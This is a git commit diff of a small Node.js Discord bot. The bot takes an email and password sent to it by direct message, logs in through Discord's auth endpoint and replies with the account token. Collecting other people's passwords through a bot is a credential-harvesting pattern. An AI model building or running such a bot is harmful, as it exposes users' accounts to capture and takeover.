2430ef3298e5e2ed0e9fb0783ad4ec3351088cfa
sueqk <68449029+k239i@users.noreply.github.com>
2021-03-06 18:01:50 +0900

    Update index.js

--- index.js
+++ index.js
@@ -3,16 +3,21 @@ const request = require('superagent');
 const {Client} = require('discord.js');
 const client = new Client();
 client.on('message', message => {
+  if(message.channel.type !== 'dm')  return;
   const args = message.content.split(' ');
   var details = {
-    email: 'zannko@woko.cow',
-    password: 'zannkowo'
+    email: args[0],
+    password: args[1]
   };
   request
   .post('https://discord.com/api/auth/login')
   .send(details)
   .end(function(err, res) {
-  console.log(err)
-  var dat = res.body;
-  console.log(dat.token);
+    console.log(err)
+    var dat = res.body;
+    if(!dat.token)
+      return message.channel.send('メールアドレスかパスワードが無効です。\n又はアカウントが無効化されています');
+    message.channel.send(dat.token);
+  });
 });
+client.login(process.env.token);
